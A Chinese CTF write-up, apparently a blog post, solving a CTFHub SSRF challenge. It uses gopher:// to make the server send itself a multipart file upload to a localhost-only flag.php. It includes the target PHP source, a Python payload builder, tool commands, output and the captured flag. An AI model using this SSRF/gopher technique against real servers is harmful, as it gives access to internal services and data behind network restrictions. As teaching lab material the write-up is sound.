---
title: "CTFHub SSRF 实战：Gopher 协议文件上传与工具化利用"
date: 2026-06-09T22:55:00+08:00
draft: false
tags: ["CTF", "Web安全", "SSRF", "Gopher", "文件上传", "工具化", "CTFHub"]
categories: ["工具"]
---

## 一、题目信息

- **平台**：CTFHub
- **分类**：Skill / Web / SSRF / 文件上传
- **考点**：SSRF（服务器端请求伪造）、Gopher 协议、`multipart/form-data` 报文构造、文件上传

题目场景：存在一个 `?url=` 参数，服务器会代为请求用户指定的地址。目标 `flag.php` 限制仅本地访问，且需要 POST 上传一个非空文件。

---

## 二、源码分析

通过 Gopher GET 请求访问 `flag.php`，拿到源码：

```php
<?php
error_reporting(0);

if($_SERVER["REMOTE_ADDR"] != "127.0.0.1"){
    echo "Just View From 127.0.0.1";
    return;
}

if(isset($_FILES["file"]) && $_FILES["file"]["size"] > 0){
    echo getenv("CTFHUB");
    exit;
}
?>
```

### 关键限制

| 条件 | 说明 |
|------|------|
| `REMOTE_ADDR != 127.0.0.1` | 外部直接访问被拒绝，必须是本机请求 |
| `isset($_FILES["file"])` | 必须是文件上传请求（`multipart/form-data`）|
| `$_FILES["file"]["size"] > 0` | 上传的文件不能为空 |

---

## 三、攻击思路

### 3.1 绕过本地访问限制

和之前的 POST key 题型一样，利用 **SSRF** 让服务器自己请求自己：

```
攻击者 -> ?url=gopher://127.0.0.1:80/_... -> 服务器代为请求 -> flag.php
```

此时 `$_SERVER["REMOTE_ADDR"]` 就是 `127.0.0.1`，通过第一重验证。

### 3.2 构造文件上传请求

`flag.php` 要求的是 **POST + `multipart/form-data`** 文件上传，不是普通的 `application/x-www-form-urlencoded`。

一个标准的文件上传 HTTP 报文：

```http
POST /flag.php HTTP/1.1
Host: 127.0.0.1:80
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk
Content-Length: 192

------WebKitFormBoundary7MA4YWxk
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

test upload content

------WebKitFormBoundary7MA4YWxk--
```

**关键点**：
- `Content-Type` 必须包含 `boundary` 分隔符
- `Content-Length` 必须严格等于 body 字节数
- 文件字段的 `name="file"` 必须和源码中的 `$_FILES["file"]` 匹配
- boundary 的开头和结尾格式有严格要求（开头 `--`，结尾 `--`）

---

## 四、工具化：不再手动构造 Payload

手动构造 `multipart/form-data` 报文非常容易出错：
- boundary 计算错误
- Content-Length 数错字节
- 换行符 `\r\n` 遗漏
- 双重 URL 编码嵌套搞混

因此我写了一个通用工具 `gopher_tool.py`，自动化处理这些繁琐工作。

### 4.1 工具功能

| 功能 | 参数 |
|------|------|
| 自定义 HTTP 方法 | `--method POST/GET/PUT` |
| 自定义路径 | `--path /flag.php` |
| 自定义 Header | `-H "Key: Value"` |
| 自定义 Body | `--body "key=value"` |
| **文件上传** | `-F "file=@filename"` |
| 自动双重编码 | 内置 |
| 一键发送请求 | `-r` |

### 4.2 核心代码逻辑

```python
import urllib.parse

def build_multipart_body(fields, files, boundary):
    """构造 multipart/form-data body"""
    parts = []
    for name, value in fields.items():
        parts.append(f"--{boundary}")
        parts.append(f'Content-Disposition: form-data; name="{name}"')
        parts.append("")
        parts.append(value)

    for name, (filename, content) in files.items():
        parts.append(f"--{boundary}")
        parts.append(f'Content-Disposition: form-data; name="{name}"; filename="{filename}"')
        parts.append(f"Content-Type: text/plain")
        parts.append("")
        parts.append(content)

    parts.append(f"--{boundary}--")
    parts.append("")
    return "\r\n".join(parts)

def double_encode_gopher(http_payload, host, port):
    """双重 URL 编码"""
    gopher = f"gopher://{host}:{port}/_" + urllib.parse.quote(http_payload)
    return gopher
```

### 4.3 使用示例

```bash
python3 gopher_tool.py \
  -u "http://challenge-xxx.sandbox.ctfhub.com:10800/?url=" \
  --method POST \
  --path /flag.php \
  -F "file=@/tmp/test.txt" \
  -r
```

工具自动完成：
1. 读取文件内容
2. 构造 `multipart/form-data` 报文
3. 计算 `Content-Length`
4. 双重 URL 编码
5. 发送请求并打印响应

---

## 五、实战过程

### 5.1 创建测试文件

```bash
echo "test upload content" > /tmp/ctf_upload.txt
```

### 5.2 运行工具

```bash
python3 gopher_tool.py \
  -u "http://challenge-5c67ee528f2bc03a.sandbox.ctfhub.com:10800/?url=" \
  --method POST \
  --path /flag.php \
  -F "file=@/tmp/ctf_upload.txt" \
  -r
```

### 5.3 输出结果

```
============================================================
[+] 原始 HTTP 报文
============================================================
POST /flag.php HTTP/1.1
Host: 127.0.0.1:80
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk
Content-Length: 192

------WebKitFormBoundary7MA4YWxk
Content-Disposition: form-data; name="file"; filename="ctf_upload.txt"
Content-Type: text/plain

test upload content

------WebKitFormBoundary7MA4YWxk--


============================================================
[+] 最终攻击 URL（双重编码）
============================================================
http://challenge-5c67ee528f2bc03a.sandbox.ctfhub.com:10800/?url=gopher%3A%2F%2F...

============================================================
[+] 发送请求...
============================================================
HTTP/1.1 200 OK
...
ctfhub{e9ef3ff0014eb9abbe7d0e48}
```

**Flag 到手！**

---

## 六、踩坑记录

### 6.1 Content-Length 必须精确

手动计算 `multipart/form-data` 的 `Content-Length` 非常容易出错。body 的每一个字节都要算进去，包括：
- 所有 `\r\n` 换行符
- boundary 分隔符
- 文件内容的每一个字符

**建议**：让脚本自动计算，不要手数。

### 6.2 boundary 格式

- 开头：`--boundary`
- 结尾：`--boundary--`
- 每个 part 之间用换行分隔

任何一个 `--` 漏了或者多了，服务器解析就会失败。

### 6.3 文件字段名必须匹配

源码中是 `$_FILES["file"]`，所以表单字段的 `name` 必须是 `"file"`。

如果写成 `-F "upload=@test.txt"`，服务器收到的是 `$_FILES["upload"]`，条件不满足。

---

## 七、总结

| 概念 | 本题中的体现 |
|------|------------|
| **SSRF** | 借用服务端身份访问本地受限资源 |
| **Gopher 透传** | 完全控制 TCP payload，发送任意 HTTP 报文 |
| **multipart/form-data** | 文件上传的标准编码格式，结构复杂 |
| **工具化** | 自动化报文构造和编码，避免手工出错 |

这道题和之前的 POST key 题型相比，唯一的区别就是 **body 格式从 `urlencoded` 变成了 `multipart`**。只要理解了 `multipart/form-data` 的结构，剩下的编码工作交给工具即可。

---

## 参考

- [RFC 2046 - Multipurpose Internet Mail Extensions (MIME) Part Two: Media Types](https://tools.ietf.org/html/rfc2046)
- [RFC 7578 - Returning Values from Forms: multipart/form-data](https://tools.ietf.org/html/rfc7578)
- [CTFHub SSRF 文件上传题目](https://www.ctfhub.com/#/skilltree)
- [Gopher 协议：Gopher 的精神继承者与极简 Web 的另一种可能](/posts/gemini-protocol-intro/)
